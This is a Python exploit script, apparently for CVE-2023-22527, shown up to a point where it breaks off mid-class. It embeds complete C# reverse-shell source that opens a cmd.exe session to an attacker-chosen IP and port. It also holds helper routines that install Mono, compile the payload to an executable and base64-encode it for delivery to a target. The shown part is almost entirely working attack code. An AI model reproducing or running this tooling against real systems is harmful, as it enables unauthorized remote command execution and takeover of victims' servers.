#!/usr/bin/python3
import requests
import platform
import subprocess
import base64
import requests.utils
import urllib3
import argparse
import textwrap
import sys
from requests import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

WINDOWS = 'Windows'
LINUX = 'Linux'
MONO_WINDOWS_URL = "https://download.mono-project.com/archive/6.12.0/windows-installer/mono-6.12.0.206-x64-0.msi"
MONO_WINDOWS_FILE = "mono.msi"

logo = '''
 /$$   /$$  /$$$$$$  /$$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$
| $$$ | $$ /$$__  $$| $$__  $$| $$      |_  $$_/ /$$__  $$|__  $$__/| $$_____/| $$$ | $$| $$_____/| $$__  $$
| $$$$| $$| $$  \ $$| $$  \ $$| $$        | $$  | $$  \__/   | $$   | $$      | $$$$| $$| $$      | $$  \ $$
| $$ $$ $$| $$$$$$$$| $$$$$$$/| $$        | $$  |  $$$$$$    | $$   | $$$$$   | $$ $$ $$| $$$$$   | $$$$$$$/
| $$  $$$$| $$__  $$| $$____/ | $$        | $$   \____  $$   | $$   | $$__/   | $$  $$$$| $$__/   | $$__  $$
| $$\  $$$| $$  | $$| $$      | $$        | $$   /$$  \ $$   | $$   | $$      | $$\  $$$| $$      | $$  \ $$
| $$ \  $$| $$  | $$| $$      | $$$$$$$$ /$$$$$$|  $$$$$$/   | $$   | $$$$$$$$| $$ \  $$| $$$$$$$$| $$  | $$
|__/  \__/|__/  |__/|__/      |________/|______/ \______/    |__/   |________/|__/  \__/|________/|__/  |__/
                                                                                    CVE-2023-22527
'''

class Main:
    def __init__(self, args):
        # Initialize reverse shell code, from (https://revshells.com/)
        self.revshell = '''
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Reverse
{
    public class Run
    {
        // Declare a StreamWriter that will be used to write to the TCP stream
        static StreamWriter streamWriter;

        public Run()
        {
            // Create a new TCP client that connects to the specified IP and port
            using (TcpClient client = new TcpClient("@IP", @PORT))
            {
                // Get the TCP stream
                using (Stream stream = client.GetStream())
                {
                    // Create a StreamReader that reads from the TCP stream
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        // Initialize the StreamWriter with the TCP stream
                        streamWriter = new StreamWriter(stream);

                        // Create a StringBuilder to hold the input from the TCP stream
                        StringBuilder strInput = new StringBuilder();

                        // Create a new process that runs cmd
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;

                        // Attach an event handler to the process's OutputDataReceived event
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);

                        // Start the process
                        p.Start();

                        // Begin asynchronously reading the standard output of the process
                        p.BeginOutputReadLine();

                        // While the process is running
                        while (true)
                        {
                            // Append the input from the TCP stream to the StringBuilder
                            strInput.Append(rdr.ReadLine());

                            // Write the input to the standard input of the process
                            p.StandardInput.WriteLine(strInput);

                            // Clear the StringBuilder
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            // Create a new instance of the Run class (reference: https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)
            new Run();
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // Create a StringBuilder to hold the output from the process
            StringBuilder strOutput = new StringBuilder();

            // If the output is not null or empty
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    // Append the output to the StringBuilder
                    strOutput.Append(outLine.Data);

                    // Write the output to the TCP stream and flush the stream
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
'''

    def __check_os(self):
        os_type = platform.system()
        if os_type == WINDOWS: return WINDOWS
        elif os_type == LINUX: return LINUX
        else:
            print("[?] Unknown OS Version")
            return False

    # Execute shell command success/failure (disregard output)
    def __execute_command(self,command):
        try:
            subprocess.run(command, shell=True, check=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            return False
    

    def __save_file(self, note):
        try:
            with open('Reverse.cs', 'w', encoding='utf-8') as f:
                f.write(note)
        except Exception as e:
            print(f'[-] An error occurred: {e}')
            return False
        else:
            return True

    def __download_file(self,url, filename=None):
        if not filename: filename = url.split('/')[-1]
        try:
            response = requests.get(url,verify=False)
            with open('./download/'+filename, 'wb') as f:
                f.write(response.content)
        except Exception as e:
            print(f'[-] An error occurred: {e}')
            return False
        else:
            return True
        

    def __check_tools(self, plat):
        if plat not in [WINDOWS, LINUX]:
            return False

        if self.__is_mono_installed(plat):
            return 1 if plat == WINDOWS else 4

        print("[+] Downloading Mono....")
        return self.__download_and_install_mono(plat)

    def __is_mono_installed(self, plat):
        command = r'"C:\Program Files\Mono\bin\mcs.bat" --version' if plat == WINDOWS else 'mcs --version'
        return self.__execute_command(command)

    def __download_and_install_mono(self, plat):
        if plat == WINDOWS:
            return self.__download_and_install_mono_windows()
        elif plat == LINUX:
            return self.__download_and_install_mono_linux()

    def __download_and_install_mono_windows(self):
        if self.__download_file(MONO_WINDOWS_URL, MONO_WINDOWS_FILE):
            print("[*] Mono Download: Please install mono in the './Download/Mono.msi' directory and try again.")
            return 2
        else:
            print("[!] Mono Download: Fail! Check network connection.")
            return 3

    def __download_and_install_mono_linux(self):
        print("[*] Atempting: sudo apt install mono-devel")
        if self.__execute_command("sudo apt install mono-devel"):
            return 2
        else:
            print("[!] Please install manually.")
            return 3

    def __convert_base64(self):
        try:
            with open('./Reverse.exe', 'rb') as f:
                binary_data = f.read()
                base64_data = base64.b64encode(binary_data).decode('utf-8')
                base64_data = base64_data.replace('\n', '')
            return base64_data
        except Exception as e:
            return False

   